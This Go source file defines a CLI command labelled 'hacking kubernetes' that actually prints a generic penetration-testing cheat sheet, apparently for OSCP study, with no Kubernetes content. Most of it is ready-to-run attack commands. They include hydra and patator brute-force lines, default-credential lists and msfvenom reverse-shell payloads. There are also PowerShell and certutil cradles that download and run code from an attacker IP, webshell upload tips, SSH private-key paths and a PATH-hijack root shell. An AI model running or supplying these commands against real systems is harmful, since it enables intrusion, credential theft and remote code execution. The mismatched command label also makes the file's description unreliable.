/*
Copyright © 2022 NAME HERE <EMAIL ADDRESS>

*/
package cmd

import (
	"fmt"

	"github.com/spf13/cobra"
)

// kubernetesCmd represents the kubernetes command
var kubernetesCmd = &cobra.Command{
	Use:   "kubernetes",
	Short: "print notes for hacking kubernetes",
	Long: `usage: qcli hack kubernetes`,
	Run: func(cmd *cobra.Command, args []string) {
		fmt.Println(`

-------------------------------------------------------------------------------------------------------------------------------------
|
|   /'\_/`\                 __        /\ \__                      /\ \
|  /\      \  _ __         /\_\    ___\ \ ,_\    __   _ __    ___ \ \/      ____
|  \ \ \__\ \/\`'__\_______\/\ \ /' _ `\ \ \/  /'__`\/\`'__\/' _ `\\/      /',__\
|   \ \ \_/\ \ \ \//\______\\ \ \/\ \/\ \ \ \_/\  __/\ \ \/ /\ \/\ \      /\__, `\
|    \ \_\\ \_\ \_\\/______/ \ \_\ \_\ \_\ \__\ \____\\ \_\ \ \_\ \_\     \/\____/
|     \/_/ \/_/\/_/           \/_/\/_/\/_/\/__/\/____/ \/_/  \/_/\/_/      \/___/
|
|
|   _____   ____    ____     ____                        __
|  /\  __`\/\  _`\ /\  _`\  /\  _`\                     /\ \__
|  \ \ \/\ \ \,\L\_\ \ \/\_\\ \ \L\ \        ___     ___\ \ ,_\    __    ____
|   \ \ \ \ \/_\__ \\ \ \/_/_\ \ ,__/      /' _ `\  / __`\ \ \/  /'__`\ /',__\
|    \ \ \_\ \/\ \L\ \ \ \L\ \\ \ \/       /\ \/\ \/\ \L\ \ \ \_/\  __//\__, `\
|     \ \_____\ `\____\ \____/ \ \_\       \ \_\ \_\ \____/\ \__\ \____\/\____/
|      \/_____/\/_____/\/___/   \/_/        \/_/\/_/\/___/  \/__/\/____/\/___/
|
|
------------------------------------------------------------------------------------------------------------------------------------
                                          RECON
------------------------------------------------------------------------------------------------------------------------------------

port scanning

	easy

	- nmap1="nmap -sV -sC $target -oN nmap1"
	- nmap-all="nmap -p- $target -oN nmap-all -T5"
	- nmap-udp="sudo nmap -sU -p U:1-65525 $target -oN nmap-udp -T5"
	- autorecon --single-target $target

	intermediate

	- nmap-vulners="nmap $target -sV --script vulners -oN nmap-vulners"

	advanced

	- send ping to confirm the host is up
	- i've heard port forwarding is a thing that helps get past a firewall?

------------------------------------------------------------------------------------------------------------------------------------

21 ftp

	easy

	- nmap ftp scan
	- wget -r --user="anonymous" --password="" ftp://$target/

	intermediate

	- login with obvious credentials
	- try reusing credentials found elsewhere

	advanced

22 ssh

	easy

	intermediate

	advanced

135 msrpc

	easy

	intermediate

	advanced

139 netbios-ssn

	easy

	intermediate

	advanced
445 samba, smb

	easy

	- smbclient \\\\$target\\share_name
	- smbget -R smb:\\\\<ip>\\share_name
	- smbmap -H $target

	intermediate

	- nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse $target
	- enum4linux -a $target
	- nmap --script smb-vuln\* -p 139,445 $target

	advanced


3389 ???

	easy

	intermediate

	advanced

8080 & 80 https, http, web

	easy

 	- whatweb $target
	- curl $target
	- burp repeater
	- gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --output gobuster_output -u http://$target:8080

	intermediate

	- nikto -h $target
	- inspect page and look for hidden directories
	- check cookies

	advanced

	- if get requests fail, try post requests
	- try a new wordlist in gobuster


------------------------------------------------------------------------------------------------------------------------------------
                                        INITIAL FOOTHOLD
------------------------------------------------------------------------------------------------------------------------------------

login portals

	easy

	- admin/admin
	- administrator/administrator
	- root/root
	- root/toor


	intermediate

	- try default credentials for that specific service
	- the try users full name (ex: mike wakowski) for a password
	- try using the name of the service (ex: mysql:mysql)

	advanced

	- try bruteforce... although this is very uncommon on OSCP
	- hydra -t 12 -V -f -l administrator -P $wordlist rdp://$target
	-  hydra -l admin -P /usr/share/wfuzz/wordlist/general/admin-panels.txt ftp://192.168.170.43/jsp/ -s 8080
	- hydra -l admin -P /usr/share/wordlists/rockyou50.txt 192.168.60.69 http-post-form "/login?local=1:username=^USER^&password=^PASS^&remember=on&_csrf=o0HODl7U-HsKv3GFGSDjzYWFiNRpyzxBnBRI&noscript=false:error:local-login-disabled" -t 64
	patator
	-  patator http_fuzz url=http://192.168.226.180/blog/Admin/ method=POST body='"/blog/Admin:login=admin&password=FILE0' 0=/usr/share/wordlists/rockyou50.txt      130 ⨯
	 accept_cookie=1 follow=1 -x ignore:fgrep='Wrong username or password'

------------------------------------------------------------------------------------------------------------------------------------

getting a shell in windows

	easy

	- creating the payload
		- msfvenom -p windows/shell_reverse_tcp LHOST=10.9.3.156 LPORT=1337 -e x86/shikata_ga_nai -f exe -o Advanced.exe

	- hosting the payload
		- python -m SimpleHTTPServer 80
		- python3 -m http.server 80

	- grabbing the payload
		- powershell iex (New-Object Net.WebClient).DownloadString('http://10.9.3.181:80/Invoke-PowerShellTcp.ps1');
			- to trigger: Invoke-PowerShellTcp -Reverse -IPAddress my_ip -Port 1337
			- see: “nishang invoke powershell” on github
		- certutil -urlcache -f http://MY_IP/winPEASx64.exe winpeas.exe

	intermediate

	- payload all the things https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
	- if your reverse shell isnt working, try another port (like port 80, or an open service port	)

	advanced

------------------------------------------------------------------------------------------------------------------------------------

getting a shell in linux

	easy

	- creating the payload
		- pentestmonkey one liners https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
		- msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.118.11 LPORT=4444 -f elf -o shell

	- hosting the payload
		- python -m SimpleHTTPServer 80
		- python3 -m http.server 80

	- grabbing the payload
		- wget 192.168.49.127/shell -O /tmp/shell
		- curl 192.168.49.127:80/shell (or something like that)

	intermediate

	- payload all the things https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
	- if your reverse shell isnt working, try another port (like port 80, or an open service port	)
	- if wget and curl don't seem to be working, confirm they exist on the machine (ex: which curl)

	advanced

	- if wget and curl failed, i've heard you can use “axel”

------------------------------------------------------------------------------------------------------------------------------------

getting a webshell

	easy

	- check for /uploads dir
	- upload phpbash if you can

	intermediate

	- make sure to URL encode commands that go through the url (ex: http://mysite/wp-admin.php?exec=ls)

	advanced

	- manually enumerate the file types you can upload (usually though they will give you a clue...)

------------------------------------------------------------------------------------------------------------------------------------

linux shell upgrade

	easy

	- initial upgrade
		- python -c 'import pty; pty.spawn("/bin/bash")'
		- python3 -c 'import pty; pty.spawn("/bin/bash")'

	- full TTY
		- ctrl+z (send shell to background)
		- stty raw -echo; fg; reset
		- (press enter twice)

	intermediate

	- echo os.system('/bin/bash')
	- /bin/bash -i
	- perl -e 'exec "/bin/bash"'
	- exec "/bin/bash"
	- os.execute('/bin/bash')

	advanced

------------------------------------------------------------------------------------------------------------------------------------

windows shell upgrade

	easy

	intermediate

	advanced


------------------------------------------------------------------------------------------------------------------------------------
                                        PRIVILEGE ESCALATION
------------------------------------------------------------------------------------------------------------------------------------

important windows directories

	- cd C:\Users\USER_NAME\Documents
	- cd C:\Users\USER_NAME\Desktop\local.txt

------------------------------------------------------------------------------------------------------------------------------------

important linux directories

	- ssh private keys
    	- /home/USER/.ssh/id_rsa

------------------------------------------------------------------------------------------------------------------------------------

windows privesc

	easy

	- WinPEAS script

	intermediate

	- PowerUp.ps1 script

	advanced

	- look through these scripts again and make sure you didn't miss anything.
	- check for reused passwords

------------------------------------------------------------------------------------------------------------------------------------

linux privesc

	easy

	- LinPEAS
	- linux exploit suggester

	intermediate

	- check LINPEAS again!
	- find setuid files
		- find / -perm -u=s -type f 2>/dev/null
		- manually search for cron jobs that run as root
	- path variable manipulation
		- (navigate to tmp folder)
		- cat /bin/sh > curl
		- chmod 777 curl
		- export PATH=tmp:$PATH
		- now run a binary that calls "curl" as root, and it will open a root shell for you

	advanced

	- make sure not to run LINPEAS in tmux, or the output will get cut off


------------------------------------------------------------------------------------------------------------------------------------
                                      MORE EXAMPLE COMMANDS
------------------------------------------------------------------------------------------------------------------------------------

John_the_ripper

   - john --show hashes_to_crack.txt

mysql

	- mysql -u username -p databasename

sqlmap

    - sqlmap -r http-post-request.txt --level=5 --risk=3
    - sqlmap http://192.168.12.12/index.php --level=5 --risk=3
    - sqlmap works MUCH BETTER when you specify the DB

rdp login

    - xfreerdp /u:admin /p:password /cert:ignore /v:$target:3389 /workarea

powershell

	- Get-Help Get-\*
	- Get-ChildItem | Select-Object -property name -first 5
	- Get-ChildItem -Recurse | Where-Object -property Name -Contains Desktop
	- Get-ChildItem -Recurse | Where-Object -property Mode -Contains d-r---
	- grab reverse shell from python http server
		- powershell iex (New-Object Net.WebClient).DownloadString('http://MY_IP>:80/Invoke-PowerShellTcp.ps1');
		- nishang https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1


------------------------------------------------------------------------------------------------------------------------------------
                                                    SCRIPTS
------------------------------------------------------------------------------------------------------------------------------------

recon

	- AutoRecon https://github.com/Tib3rius/AutoRecon


------------------------------------------------------------------------------------------------------------------------------------

windows

	- Invoke Powershell (nishang) https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1
	- PowerUp.ps1 https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1

------------------------------------------------------------------------------------------------------------------------------------

linux

	- linux exploit suggester https://github.com/mzet-/linux-exploit-suggester
			`)
	},
}

func init() {
	hackCmd.AddCommand(kubernetesCmd)

	// Here you will define your flags and configuration settings.

	// Cobra supports Persistent Flags which will work for this command
	// and all subcommands, e.g.:
	// kubernetesCmd.PersistentFlags().String("foo", "", "A help for foo")

	// Cobra supports local flags which will only run when this command
	// is called directly, e.g.:
	// kubernetesCmd.Flags().BoolP("toggle", "t", false, "Help message for toggle")
}
